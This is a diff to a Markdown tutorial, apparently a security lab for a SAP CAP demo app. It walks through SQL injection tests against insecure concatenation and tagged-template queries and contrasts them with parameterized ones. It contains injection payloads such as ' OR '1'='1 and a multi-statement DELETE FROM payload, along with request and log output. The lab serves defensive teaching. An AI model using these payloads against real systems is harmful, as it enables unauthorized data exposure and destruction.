@@ -273,9 +273,7 @@ This file contains multiple HTTP requests grouped into three logical test catego
   Uses a true-clause payload ("1004100' OR '1'='1") to show that the insecure methods (concat and tagged) may return many or all rows, while the safe method treats it as literal input.
 
   - **Test 3:** A SQL Injection using multiple SQL statements.
-  Attempts a multi-statement payload ("1004100'; DELETE FROM ...;--") to demonstrate how insecure implementations could allow destructive behavior, while the safe method neutralizes the input through parameterization.
-
-Test 3: A SQL Injection using multiple SQL statements. Attempts a multi-statement payload ("1004100'; SELECT * FROM ...;--") to demonstrate how an insecure query can be tricked into appending extra SQL, while the safe method neutralizes this attack by treating the entire payload as a single literal parameter value.
+  Attempts a multi-statement payload ("1004100'; DELETE FROM ...;--") to demonstrate how insecure query could allow destructive behavior, while the safe method neutralizes the input through parameterization.
 
 ### 🪜 Step 2: Exploit the SQL Injection Vulnerability
 - ▶️ Action:
@@ -288,14 +286,41 @@ Test 3: A SQL Injection using multiple SQL statements. Attempts a multi-statemen
   cds deploy
   cds watch
 ```
-- Action:
+- ▶️ Action:
   - Open the `sql-injection-demo.http` file in your editor.
   - Confirm in your `package.json` file that the user `incident.support@tester.sap.com` is assigned the `admin` role under the `cds.requires.[development].auth.users` configuration.
   - In `sql-injection-demo.http`, navigate to Test 2 to look up customer information and click on Send Request (added by the editor in the line above the GET statement).
   
 ``` 
-  ### 🚨 Test 2: SQL Injection True-Clause Attack
-  ### Action: Inject malicious payload ' OR '1'='1
+  ### 🚨 Test A2: True-clause injection (concat)
+  ### Action: Inject malicious payload ' OR '1'='1 (always true)
+  ### Expected: Returns ALL customer records
+  ### Result: Full database exposure vulnerability
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  {
+    "customerID": "1004100' OR '1'='1"
+  }
+```
+- Result:
+
+```
+[odata] - GET /odata/v4/admin/fetchCustomer  
+⚠️ Using INSECURE string concatenation method.
+❌ Vulnerable query constructed: SELECT * FROM sap_capire_incidents_Customers WHERE ID = '1004100' OR '1'='1'
+✅ Results count: 3
+``` 
+
+✅ Exploitation successful: The application returned the entire contents of the Customers table instead of just the record for customer ID 1004100.
+
+- ▶️ Action: In `sql-injection-demo.http`, navigate to Test B2 to look up customer information and click on Send Request.
+
+
+
+``` 
+  ### 🚨 Test B2: True-clause injection (tagged) → may return many/all rows
+  ### Action: Inject malicious payload ' OR '1'='1 (always true)
   ### Expected: Returns ALL customer records
   ### Result: Full database exposure vulnerability
   GET {{server}}/odata/v4/admin/fetchCustomer
@@ -308,63 +333,16 @@ Test 3: A SQL Injection using multiple SQL statements. Attempts a multi-statemen
 - Result:
 
 ``` 
-  HTTP/1.1 200 OK
-  X-Powered-By: Express
-  X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
-  OData-Version: 4.0
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 950
-  Date: Sun, 28 Sep 2025 19:02:26 GMT
-  Connection: close
-  
-  {
-    "@odata.context": "$metadata#Customers",
-    "value": [
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004155",
-        "firstName": "Daniel",
-        "lastName": "Watts",
-        "name": "Daniel Watts",
-        "email": "daniel.watts@demo.com",
-        "phone": "+39-555-123",
-        "creditCardNo": "4111111111111111"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004161",
-        "firstName": "Stormy",
-        "lastName": "Weathers",
-        "name": "Stormy Weathers",
-        "email": "stormy.weathers@demo.com",
-        "phone": "+49-020-022",
-        "creditCardNo": "5500000000000004"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004100",
-        "firstName": "Sunny",
-        "lastName": "Sunshine",
-        "name": "Sunny Sunshine",
-        "email": "sunny.sunshine@demo.com",
-        "phone": "+49-555-789",
-        "creditCardNo": "3400000000000094"
-      }
-    ]
-  }  
+[odata] - GET /odata/v4/admin/fetchCustomer 
+⚠️ Using INSECURE parenthesized tagged template method.
+❌ PARENTHESES DETECTED: strings is plain string, not array!
+❌ Vulnerable query constructed: SELECT * FROM sap_capire_incidents_Customers WHERE ID = '1004100' OR '1'='1'
+✅ Results count: 3
 
 ``` 
-
-✅ Exploitation successful: The application returned the entire contents of the Customers table instead of just the record for customer ID 1004100.
+✅ Exploitation successful: 
+  - Same vulnerability as concat method: ALL customer records returned.
+  - Parentheses cause immediate template evaluation, defeating the intended parameterization protection.
 
     
 ### 📌Critical Vulnerability Summary
